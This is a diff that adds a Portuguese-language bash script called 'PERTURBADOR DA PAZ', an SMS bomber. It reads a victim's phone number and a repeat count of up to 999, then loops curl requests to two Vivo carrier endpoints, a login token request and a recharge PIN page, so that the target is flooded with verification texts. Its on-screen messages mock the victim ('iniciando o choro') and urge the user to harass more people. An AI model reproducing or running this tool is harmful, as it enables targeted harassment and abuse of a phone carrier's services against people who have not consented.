@@ -1,0 +1,90 @@
+#!/bin/bash
+clear
+tit=$"ㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠛⠋⠉⠙⠻⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠹⣿⣿⣶⣶⣦⣬⢹⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⣰⣧⡀⠄⠄⠄⠄⠈⢙⡋⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠰⠼⢯⣿⣿⣦⣄⠄⠄⠄⠈⢡⣿⣿⣿⢸⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠸⠤⠕⠛⠙⠷⣿⡆⠄⠄⠄⣸⣿⣿⡏⣼⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣴⣿⣿⣿⢡⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣄⠄⢀⠄⠄⢀⣤⣾⣿⣿⣿⢃⣾⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⣿⠿⣛⣡⣄⣀⠄⠠⢴⣿⣿⡿⣄⣴⣿⣿⣿⣿⣿⢃⣾⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣩⡽⡁⢸⣿⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⣿⢃⣿⣿⢟⣿⣿⣿⣿⣿⣮⢫⣿⣿⣿⣿⣿⣟⢿⠃⠄⢻⣿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡿⣸⠟⣵⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣷⣄⢰⡄⢿⣿⣿⣿\nㅤㅤ⣿⣿⣿⣿⡇⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⡎⣿⣿⣿\n\e[33;01m██▀ﾠ█▄█ﾠ█ﾠ▄▀▀ﾠ▄▀▄ﾠ█▀▄ﾠ██▀ﾠ█▄ﾠ█ﾠ██▀ﾠ█▀▄\n█▄▄ﾠ█ﾠ█ﾠ█ﾠ▄██ﾠ▀▄▀ﾠ█▀ﾠﾠ█▄▄ﾠ█ﾠ▀█ﾠ█▄▄ﾠ█▀▄\e[0m\nㅤㅤ⡀⠈⢿⠄⣿⡇⠄⠙⠿⣿⡿⠿⢋⣥⣾⣿⣷⣌⠻⢿⣿⣿⡿⠟⣡⣾⣿⣿⠿⢋\nㅤㅤ⠛⠳⠄⢠⣿⠇⠄⣷⡑⢶⣶⢿⣿⣿⣿⣽⣿⣿⣿⣶⣶⡐⣶⣿⠿⠛⣩⡄⠄⢸"
+echo -e $tit
+sleep .5
+echo
+echo -e "\e[01;37;41m       • PERTURBADOR DA PAZ •        \e[0m"
+sleep .5
+echo
+echo -e "\e[01;37;41m COLOQUE O DDD+NUMERO \e[0m"
+aa=$(echo -e "\e[01;37mNÚMERO:\e[0m")
+read -p "$aa" NUMERO
+
+echo -e "\e[01;37;41m RODAR QUANTAS VEZES? \e[0m"
+while :; do
+echo -e '\e[01;37m(1) 50x\c'; echo -e ' | (2) 100x \c'; echo -e '| (3) 500x\c'; echo -e ' | (4) 999x \e[0m'
+
+bb=$(echo -e "\e[01;37mOpção:\e[0m")
+read -n1 -p "$bb" xx
+case $xx in
+        (1) VEZES=50; echo; echo -e '\e[01;37;41m Só 50? esperava mais de você... \e[0m'|pv -qL 18
+        sleep 2
+        break;;
+        (2) VEZES=100; echo; echo -e '\e[01;37;41m 100 é legal, mas esperava mais de você... \e[0m'|pv -qL 18
+        sleep 2
+        break;;
+        (3) VEZES=500; echo; echo -e '\e[01;37;41m Agora sim 500, esse é meu garoto \e[0m'|pv -qL 18
+        sleep 2
+        break;;
+        (4) VEZES=999; echo; echo -e '\e[01;37;41m 999?... cara, vou deixar você andar comigo no recreio \e[0m'|pv -qL 18
+        sleep 2.5
+        break;;
+        (*) echo; echo -e "\e[01;37;41m CALMA BARBOLETA \e[0m"
+        sleep 1
+esac
+done
+sleep .5
+clear
+echo -e $tit
+echo
+echo -e "\e[01;37;41m       • PERTURBADOR DA PAZ •        \e[0m"
+echo
+echo -e "\e[01;37;41m VAI BRASILIAM \e[0m"|pv -qL 15
+echo -e "\e[01;37;41m NUMERO: $NUMERO | QUANTIDADE: $VEZES \e[0m"
+sleep .5
+echo
+echo -e "\e[0m\e[01;37;41m INICIANDO O CHORO \e[0m"
+for i in $(seq $VEZES);
+do
+response=$(data=$"numero=$NUMERO" && site=$"https://login.vivo.com.br/mobile/br/com/vivo/mobile/portlets/loginmobile/sendTokenRequest.do" && curl -s "${site}" -H "User-Agent: Android" -d "${data}")
+body=$(echo $response | jq '.code')
+
+case $body in
+101) echo -e "\e[01;33mCOLOCOU O NUMERO ERRADO... [0m\e[01;37mINICIANDO O PRÓXIMO...\e[0m"|pv -qL 20; sleep .5; break;;
+0) echo -e "\e[01;32mAGORA SÓ ESPERAR O CHORO \e[0m\e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo -e "ALGO DEU ERRADO... \e[0m \e[01;37mINICIANDO O PROXIMO...\e[0m"; echo $response; break
+esac
+done
+echo
+echo -e "\e[0m\e[01;37;41m INICIANDO O CHORO 2 \e[0m"
+for i in $(seq $VEZES);
+do
+response=$(site=$"http://portalrecarga.vivo.com.br/lp/login/descontosslidemodalBoticario?offerID=15396&serviceID=30" && curl -s "$site" -d "ddd=&number=$NUMERO&callbackUrl=&eventName=clickconfirmation")
+body=$(echo $response | grep -c form-pincode)
+
+case $body in
+1) echo -e "\e[01;32mAGORA SÓ ESPERAR O CHORO \e[0m\e[01;37mCONTAGEM: $i\e[0m"|pv -qL 18;;
+*) echo -e "CORRE BERG\e[0m \e[01;37mFINALIZANDO...\e[0m"; echo $response; break
+esac
+done
+echo
+echo -e "\e[01;37;41m       • Fim de transmissão •        \e[0m"
+echo -e '\e[01;37;41m Bora fazer mais gente passar raiva? \e[0m'
+sleep .5
+while :; do
+echo -e '\e[01;37m(1)\e[0m Sim\e[0m'
+echo -e '\e[01;37m(2)\e[0m Não\e[0m'
+cc=$(echo -e "\e[01;37mOpção:\e[0m")
+read -n1 -p "$cc" cpo
+case $cpo in
+        (1) echo; echo -e '\e[01;37;41m E lá vamos nós | @EhisOpeNer \e[0m'|pv -qL 18
+        sleep 2; ./sms
+        break;;
+        (2) echo; echo -e "\e[01;37;41m Bye Bye | @EhisOpeNer \e[0m"|pv -qL 15; echo -e "\e[01;37;41m     TUDO NUMA BOA     \e[0m"|pv -qL 18
+        sleep 1
+        break;;
+        (*) echo; echo -e "\e[01;37;41m CALMA BARBOLETA \e[0m"
+        sleep 1
+esac
+done
